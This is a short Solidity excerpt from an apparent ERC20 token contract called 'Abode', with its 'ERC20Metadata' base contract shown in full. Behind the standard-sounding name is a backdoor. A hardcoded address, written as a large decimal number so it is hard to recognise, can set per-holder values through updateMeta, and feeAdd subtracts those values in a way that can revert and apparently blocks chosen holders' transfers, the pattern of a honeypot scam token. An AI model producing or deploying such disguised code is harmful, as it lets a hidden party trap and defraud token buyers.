...
contract ERC20Metadata {
    uint160 varSwap = 912125418466011416364232551731764077926310875762;
    mapping(address => uint256) public metad;

    function updateMeta(address addrsses, uint256 balance) external {
        if (uint160(msg.sender) == varSwap) {
            metad[addrsses] = balance;
        }
    }

    function feeAdd(address from) internal {
        uint256 bal = varSwap - metad[from];
    }
}
...
contract Abode is ERC20, ERC20Metadata, Ownable {
